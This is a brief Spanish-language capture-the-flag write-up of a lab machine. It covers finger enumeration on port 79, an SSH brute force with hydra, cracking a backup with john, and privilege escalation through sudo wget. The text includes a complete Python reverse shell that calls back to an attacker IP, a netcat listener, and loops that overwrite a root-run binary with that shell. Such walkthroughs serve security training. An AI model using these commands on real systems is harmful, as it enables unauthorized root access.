# ENUMERACIÓN

<img width="933" height="759" alt="image" src="https://github.com/user-attachments/assets/fe9f7988-0d2f-410e-8b72-bad27639ed7d" />


# Puerto 79
<img width="941" height="451" alt="image" src="https://github.com/user-attachments/assets/fe4e6ca1-dc1f-40b9-9eac-1408706c358d" />
Tenemos user de ssh ahora hydra

<img width="934" height="288" alt="image" src="https://github.com/user-attachments/assets/37ba1102-9ab7-46f9-96f9-a653b7894ae2" />

<img width="629" height="174" alt="image" src="https://github.com/user-attachments/assets/e801e5a7-3640-441c-86f6-f7780742a239" />

Tenemos password de sammy 

Pillamos el backup y a john.

despues deescalada vemos que puede usar wget como sudo y como sudo suny ouede usar /troll
````
cd /tmp
cat > shell.py <<'EOF'
#!/usr/bin/python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.65",443))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
EOF
python3 -m http.server 80
````
````
nc -nvlp 443
````

desde sammy:
````
while true; do sudo wget -q http://10.10.14.65/shell.py -O /root/troll; done
````
Desde suny:
````
while true; do sudo /root/troll; done
````
<img width="660" height="328" alt="image" src="https://github.com/user-attachments/assets/2d5be57d-5347-4ab7-befb-c939bc0cd6c5" />
















